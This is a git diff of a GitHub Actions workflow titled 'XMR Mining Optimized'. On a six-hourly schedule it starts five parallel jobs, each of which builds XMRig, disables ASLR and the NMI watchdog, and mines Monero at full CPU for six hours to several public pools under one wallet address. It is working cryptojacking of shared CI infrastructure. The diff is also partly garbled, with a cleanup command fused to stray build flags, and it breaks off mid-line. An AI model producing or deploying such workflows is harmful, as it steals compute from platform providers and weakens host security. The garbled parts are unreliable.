@@ -1,4 +1,4 @@
-name: test
+name: XMR Mining Optimized
 
 on:
   workflow_dispatch:
@@ -6,7 +6,7 @@ on:
     - cron: '0 */6 * * *'
 
 jobs:
-  mine:
+  mine-1:
     runs-on: ubuntu-latest
     timeout-minutes: 360
     
@@ -38,7 +38,7 @@ jobs:
           {
             "api": {
               "id": null,
-              "worker-id": "gh-runner"
+              "worker-id": "r5"
             },
             "autosave": true,
             "background": false,
@@ -54,7 +54,29 @@ jobs:
               "max-threads-hint": 100,
               "asm": "auto",
               "argon2-impl": "auto",
-              "rx": [0, 1, 2, 3, 4]
+              "cn/0": false,
+              "cn-lite/0": false,
+              "rx": [0, 1],
+              "rx/0": [0, 1],
+              "rx/wow": [0, 1],
+              "cn-heavy/0": false,
+              "cn-heavy/tube": false,
+              "cn-heavy/xhv": false,
+              "cn-pico": false,
+              "cn-pico/tlo": false,
+              "cn/1": false,
+              "cn/2": false,
+              "cn/r": false,
+              "cn/fast": false,
+              "cn/half": false,
+              "cn/xao": false,
+              "cn/rto": false,
+              "cn/rwz": false,
+              "cn/zls": false,
+              "cn/double": false,
+              "rx/arq": [0, 1],
+              "rx/keva": [0, 1],
+              "rx/sfx": [0, 1]
             },
             "opencl": false,
             "cuda": false,
@@ -65,13 +87,13 @@ jobs:
               {
                 "algo": "rx/0",
                 "coin": "monero",
-                "url": "xmr.2miners.com:2222",
+                "url": "pool.minexmr.com:443",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "x",
-                "rig-id": "gh-primary",
+                "pass": "r5",
+                "rig-id": "r5",
                 "keepalive": true,
                 "enabled": true,
-                "tls": false,
+                "tls": true,
                 "tls-fingerprint": null,
                 "daemon": false,
                 "socks5": null,
@@ -81,10 +103,10 @@ jobs:
               {
                 "algo": "rx/0",
                 "coin": "monero",
-                "url": "pool.minexmr.com:443",
+                "url": "pool.hashvault.pro:443",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "x",
-                "rig-id": "gh-backup1",
+                "pass": "r5",
+                "rig-id": "r5",
                 "keepalive": true,
                 "enabled": true,
                 "tls": true,
@@ -94,10 +116,10 @@ jobs:
               {
                 "algo": "rx/0",
                 "coin": "monero",
-                "url": "pool.hashvault.pro:443",
+                "url": "pool.supportxmr.com:443",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "x",
-                "rig-id": "gh-backup2",
+                "pass": "r5",
+                "rig-id": "r5",
                 "keepalive": true,
                 "enabled": true,
                 "tls": true,
@@ -109,8 +131,8 @@ jobs:
                 "coin": "monero",
                 "url": "xmr-eu1.nanopool.org:14433",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "x",
-                "rig-id": "gh-backup3",
+                "pass": "r5",
+                "rig-id": "r5",
                 "keepalive": true,
                 "enabled": true,
                 "tls": true,
@@ -148,10 +170,698 @@ jobs:
       - name: Start Mining Maximum Performance
         run: |
           cd xmrig/build
-          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 --threads=5 || true
+          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
+          
+      - name: Cleanup
+        if: always()
+        run: |
+          sudo pkill -9 xmrig || true
+          rm -rf xmrigLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
+          make -j$(nproc)
+          
+      - name: Advanced Configuration
+        run: |
+          cd xmrig/build
+          cat > config.json <<EOF
+          {
+            "api": {
+              "id": null,
+              "worker-id": "r1"
+            },
+            "autosave": true,
+            "background": false,
+            "colors": true,
+            "cpu": {
+              "enabled": true,
+              "huge-pages": true,
+              "huge-pages-jit": true,
+              "hw-aes": true,
+              "priority": 5,
+              "memory-pool": true,
+              "yield": false,
+              "max-threads-hint": 100,
+              "asm": "auto",
+              "argon2-impl": "auto",
+              "cn/0": false,
+              "cn-lite/0": false,
+              "rx": [0, 1],
+              "rx/0": [0, 1],
+              "rx/wow": [0, 1],
+              "cn-heavy/0": false,
+              "cn-heavy/tube": false,
+              "cn-heavy/xhv": false,
+              "cn-pico": false,
+              "cn-pico/tlo": false,
+              "cn/1": false,
+              "cn/2": false,
+              "cn/r": false,
+              "cn/fast": false,
+              "cn/half": false,
+              "cn/xao": false,
+              "cn/rto": false,
+              "cn/rwz": false,
+              "cn/zls": false,
+              "cn/double": false,
+              "rx/arq": [0, 1],
+              "rx/keva": [0, 1],
+              "rx/sfx": [0, 1]
+            },
+            "opencl": false,
+            "cuda": false,
+            "donate-level": 1,
+            "donate-over-proxy": 1,
+            "log-file": null,
+            "pools": [
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.minexmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r1",
+                "rig-id": "r1",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false,
+                "socks5": null,
+                "self-select": null,
+                "submit-to-origin": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.hashvault.pro:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r1",
+                "rig-id": "r1",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.supportxmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r1",
+                "rig-id": "r1",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "xmr-eu1.nanopool.org:14433",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r1",
+                "rig-id": "r1",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              }
+            ],
+            "print-time": 60,
+            "health-print-time": 60,
+            "dmi": true,
+            "retries": 10,
+            "retry-pause": 5,
+            "syslog": false,
+            "tls": {
+              "enabled": false,
+              "protocols": null,
+              "cert": null,
+              "cert_key": null,
+              "ciphers": null,
+              "ciphersuites": null,
+              "dhparam": null
+            },
+            "user-agent": null,
+            "verbose": 0,
+            "watch": true,
+            "pause-on-battery": false,
+            "pause-on-active": false
+          }
+          EOF
+          
+      - name: CPU Governor Performance
+        run: |
+          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
+          
+      - name: Start Mining Maximum Performance
+        run: |
+          cd xmrig/build
+          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
           
       - name: Cleanup
         if: always()
         run: |
           sudo pkill -9 xmrig || true
           rm -rf xmrig
+
+  mine-2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+      - name: System Optimization
+        run: |
+          sudo sysctl -w vm.nr_hugepages=1280
+          sudo sysctl -w kernel.randomize_va_space=0
+          sudo sysctl -w vm.swappiness=1
+          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
+          
+      - name: Install Dependencies
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git cpulimit
+          
+      - name: Build XMRig
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build && cd build
+          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
+          make -j$(nproc)
+          
+      - name: Advanced Configuration
+        run: |
+          cd xmrig/build
+          cat > config.json <<EOF
+          {
+            "api": {
+              "id": null,
+              "worker-id": "r2"
+            },
+            "autosave": true,
+            "background": false,
+            "colors": true,
+            "cpu": {
+              "enabled": true,
+              "huge-pages": true,
+              "huge-pages-jit": true,
+              "hw-aes": true,
+              "priority": 5,
+              "memory-pool": true,
+              "yield": false,
+              "max-threads-hint": 100,
+              "asm": "auto",
+              "argon2-impl": "auto",
+              "cn/0": false,
+              "cn-lite/0": false,
+              "rx": [0, 1],
+              "rx/0": [0, 1],
+              "rx/wow": [0, 1],
+              "cn-heavy/0": false,
+              "cn-heavy/tube": false,
+              "cn-heavy/xhv": false,
+              "cn-pico": false,
+              "cn-pico/tlo": false,
+              "cn/1": false,
+              "cn/2": false,
+              "cn/r": false,
+              "cn/fast": false,
+              "cn/half": false,
+              "cn/xao": false,
+              "cn/rto": false,
+              "cn/rwz": false,
+              "cn/zls": false,
+              "cn/double": false,
+              "rx/arq": [0, 1],
+              "rx/keva": [0, 1],
+              "rx/sfx": [0, 1]
+            },
+            "opencl": false,
+            "cuda": false,
+            "donate-level": 1,
+            "donate-over-proxy": 1,
+            "log-file": null,
+            "pools": [
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.minexmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r2",
+                "rig-id": "r2",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false,
+                "socks5": null,
+                "self-select": null,
+                "submit-to-origin": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.hashvault.pro:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r2",
+                "rig-id": "r2",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.supportxmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r2",
+                "rig-id": "r2",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "xmr-eu1.nanopool.org:14433",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r2",
+                "rig-id": "r2",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              }
+            ],
+            "print-time": 60,
+            "health-print-time": 60,
+            "dmi": true,
+            "retries": 10,
+            "retry-pause": 5,
+            "syslog": false,
+            "tls": {
+              "enabled": false,
+              "protocols": null,
+              "cert": null,
+              "cert_key": null,
+              "ciphers": null,
+              "ciphersuites": null,
+              "dhparam": null
+            },
+            "user-agent": null,
+            "verbose": 0,
+            "watch": true,
+            "pause-on-battery": false,
+            "pause-on-active": false
+          }
+          EOF
+          
+      - name: CPU Governor Performance
+        run: |
+          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
+          
+      - name: Start Mining Maximum Performance
+        run: |
+          cd xmrig/build
+          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
+          
+      - name: Cleanup
+        if: always()
+        run: |
+          sudo pkill -9 xmrig || true
+          rm -rf xmrig
+
+  mine-3:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+      - name: System Optimization
+        run: |
+          sudo sysctl -w vm.nr_hugepages=1280
+          sudo sysctl -w kernel.randomize_va_space=0
+          sudo sysctl -w vm.swappiness=1
+          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
+          
+      - name: Install Dependencies
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git cpulimit
+          
+      - name: Build XMRig
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build && cd build
+          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
+          make -j$(nproc)
+          
+      - name: Advanced Configuration
+        run: |
+          cd xmrig/build
+          cat > config.json <<EOF
+          {
+            "api": {
+              "id": null,
+              "worker-id": "r3"
+            },
+            "autosave": true,
+            "background": false,
+            "colors": true,
+            "cpu": {
+              "enabled": true,
+              "huge-pages": true,
+              "huge-pages-jit": true,
+              "hw-aes": true,
+              "priority": 5,
+              "memory-pool": true,
+              "yield": false,
+              "max-threads-hint": 100,
+              "asm": "auto",
+              "argon2-impl": "auto",
+              "cn/0": false,
+              "cn-lite/0": false,
+              "rx": [0, 1],
+              "rx/0": [0, 1],
+              "rx/wow": [0, 1],
+              "cn-heavy/0": false,
+              "cn-heavy/tube": false,
+              "cn-heavy/xhv": false,
+              "cn-pico": false,
+              "cn-pico/tlo": false,
+              "cn/1": false,
+              "cn/2": false,
+              "cn/r": false,
+              "cn/fast": false,
+              "cn/half": false,
+              "cn/xao": false,
+              "cn/rto": false,
+              "cn/rwz": false,
+              "cn/zls": false,
+              "cn/double": false,
+              "rx/arq": [0, 1],
+              "rx/keva": [0, 1],
+              "rx/sfx": [0, 1]
+            },
+            "opencl": false,
+            "cuda": false,
+            "donate-level": 1,
+            "donate-over-proxy": 1,
+            "log-file": null,
+            "pools": [
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.minexmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r3",
+                "rig-id": "r3",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false,
+                "socks5": null,
+                "self-select": null,
+                "submit-to-origin": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.hashvault.pro:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r3",
+                "rig-id": "r3",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.supportxmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r3",
+                "rig-id": "r3",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "xmr-eu1.nanopool.org:14433",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r3",
+                "rig-id": "r3",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              }
+            ],
+            "print-time": 60,
+            "health-print-time": 60,
+            "dmi": true,
+            "retries": 10,
+            "retry-pause": 5,
+            "syslog": false,
+            "tls": {
+              "enabled": false,
+              "protocols": null,
+              "cert": null,
+              "cert_key": null,
+              "ciphers": null,
+              "ciphersuites": null,
+              "dhparam": null
+            },
+            "user-agent": null,
+            "verbose": 0,
+            "watch": true,
+            "pause-on-battery": false,
+            "pause-on-active": false
+          }
+          EOF
+          
+      - name: CPU Governor Performance
+        run: |
+          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
+          
+      - name: Start Mining Maximum Performance
+        run: |
+          cd xmrig/build
+          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
+          
+      - name: Cleanup
+        if: always()
+        run: |
+          sudo pkill -9 xmrig || true
+          rm -rf xmrig
+
+  mine-4:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+      - name: System Optimization
+        run: |
+          sudo sysctl -w vm.nr_hugepages=1280
+          sudo sysctl -w kernel.randomize_va_space=0
+          sudo sysctl -w vm.swappiness=1
+          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
+          
+      - name: Install Dependencies
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git cpulimit
+          
+      - name: Build XMRig
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build && cd build
+          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
+          make -j$(nproc)
+          
+      - name: Advanced Configuration
+        run: |
+          cd xmrig/build
+          cat > config.json <<EOF
+          {
+            "api": {
+              "id": null,
+              "worker-id": "r4"
+            },
+            "autosave": true,
+            "background": false,
+            "colors": true,
+            "cpu": {
+              "enabled": true,
+              "huge-pages": true,
+              "huge-pages-jit": true,
+              "hw-aes": true,
+              "priority": 5,
+              "memory-pool": true,
+              "yield": false,
+              "max-threads-hint": 100,
+              "asm": "auto",
+              "argon2-impl": "auto",
+              "cn/0": false,
+              "cn-lite/0": false,
+              "rx": [0, 1],
+              "rx/0": [0, 1],
+              "rx/wow": [0, 1],
+              "cn-heavy/0": false,
+              "cn-heavy/tube": false,
+              "cn-heavy/xhv": false,
+              "cn-pico": false,
+              "cn-pico/tlo": false,
+              "cn/1": false,
+              "cn/2": false,
+              "cn/r": false,
+              "cn/fast": false,
+              "cn/half": false,
+              "cn/xao": false,
+              "cn/rto": false,
+              "cn/rwz": false,
+              "cn/zls": false,
+              "cn/double": false,
+              "rx/arq": [0, 1],
+              "rx/keva": [0, 1],
+              "rx/sfx": [0, 1]
+            },
+            "opencl": false,
+            "cuda": false,
+            "donate-level": 1,
+            "donate-over-proxy": 1,
+            "log-file": null,
+            "pools": [
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.minexmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r4",
+                "rig-id": "r4",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false,
+                "socks5": null,
+                "self-select": null,
+                "submit-to-origin": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.hashvault.pro:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r4",
+                "rig-id": "r4",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.supportxmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r4",
+                "rig-id": "r4",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "xmr-eu1.nanopool.org:14433",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "r4",
+                "rig-id": "r4",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              }
+            ],
+            "print-time": 60,
+            "health-print-time": 60,
+            "dmi": true,
+            "retries": 10,
+            "retry-pause": 5,
+            "syslog": false,
+            "tls": {
+              "enabled": false,
+              "protocols": null,
+              "cert": null,
+              "cert_key": null,
+              "ciphers": null,
+              "ciphersuites": null,
+              "dhparam": null
+            },
+            "user-agent": null,
+            "verbose": 0,
+            "watch": true,
+            "pause-on-battery": false,
+            "pause-on-active": false
+          }
+          EOF
+          
+      - name: CPU Governor Performance
+        run: |
+          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
+          
+      - name: Start Mining Maximum Performance
+        run: |
+          cd xmrig/build
+          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
+          
+      - name: Cleanup
+        if: always()
+        run: |
+          sudo pkill -9 xmrig || true
+          rm -rf xmrig
+
+  mine-5:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+      - name: System Optimization
+        run: |
+          sudo sysctl -w vm.nr_hugepages=1280
+          sudo sysctl -w kernel.randomize_va_space=0
+          sudo sysctl -w vm.swappiness=1
+          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
+          
+      - name: Install Dependencies
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git cpulimit
+          
+      - name: Build XMRig
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build && cd build
+          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HW
